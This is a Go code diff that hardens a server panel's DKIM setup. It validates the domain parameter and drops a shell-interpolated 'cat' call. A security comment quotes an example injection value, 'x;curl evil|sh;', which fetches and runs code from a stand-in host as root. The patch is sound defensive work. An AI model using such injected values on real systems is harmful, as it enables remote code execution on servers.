@@ -1772,6 +1772,15 @@ func (s *EmailService) EnsureDKIMForDomain(ctx context.Context, domain string) {
 }
 
 func (s *EmailService) SetupDKIM(ctx context.Context, domain string) (map[string]interface{}, error) {
+	// Security (audit §8): this endpoint takes a raw :domain URL param and
+	// interpolates it into several `bash -c` strings below (signing/key tables,
+	// trusted.hosts, and an UNQUOTED `cat <keyDir>/mail.txt`). Unlike domain
+	// CREATE, the DKIM route never gated the value, so a :domain like
+	// `x;curl evil|sh;` would run as root. Reject any non-shell-safe domain here.
+	domain = strings.ToLower(strings.TrimSpace(domain))
+	if !validator.IsSafeDNSName(domain) {
+		return nil, fmt.Errorf("invalid domain name %q", domain)
+	}
 	keyDir := fmt.Sprintf("/etc/opendkim/keys/%s", domain)
 	agent.RunCommand(ctx, "mkdir", "-p", keyDir)
 
@@ -1793,8 +1802,9 @@ func (s *EmailService) SetupDKIM(ctx context.Context, domain string) (map[string
 	// Reload OpenDKIM
 	agent.RunCommand(ctx, "systemctl", "reload", "opendkim")
 
-	// Read the public key to return as DNS record
-	pubResult, _ := agent.RunCommand(ctx, "bash", "-c", fmt.Sprintf("cat %s/mail.txt", keyDir))
+	// Read the public key to return as DNS record (argv, no shell — keyDir is
+	// panel-built from the now-validated domain, but keep it shell-free anyway).
+	pubResult, _ := agent.RunCommand(ctx, "cat", keyDir+"/mail.txt")
 	dnsRecord := ""
 	if pubResult != nil {
 		dnsRecord = strings.TrimSpace(pubResult.Output)
